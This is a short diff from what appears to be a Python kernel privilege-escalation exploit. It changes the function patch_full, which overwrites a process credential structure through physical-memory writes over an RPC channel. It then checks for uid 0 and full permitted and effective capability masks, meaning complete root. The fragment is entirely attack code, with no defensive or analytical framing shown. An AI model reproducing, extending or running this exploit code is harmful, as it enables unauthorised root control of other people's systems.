@@ -173,10 +173,9 @@ def patch_full(rpc, cred_phys):
             if st != 0:
                 print(f"[-] cap write at cred+{off + k} failed: {st}", flush=True)
                 return False
-    caps = rpc.read(cred_phys + 40, 40)
-    perm = int.from_bytes(caps[8:16], "little")
-    eff = int.from_bytes(caps[16:24], "little")
-    uid = int.from_bytes(caps[0:4], "little")
+    uid = int.from_bytes(rpc.read(cred_phys + 4, 4), "little")
+    perm = int.from_bytes(rpc.read(cred_phys + O_CAP_PERMITTED, 8), "little")
+    eff = int.from_bytes(rpc.read(cred_phys + O_CAP_EFFECTIVE, 8), "little")
     print(f"[+] cred now uid={uid} cap_permitted={perm:#x} cap_effective={eff:#x}",
           flush=True)
     return uid == 0 and perm == 0x3FFFFFFFFF and eff == 0x3FFFFFFFFF
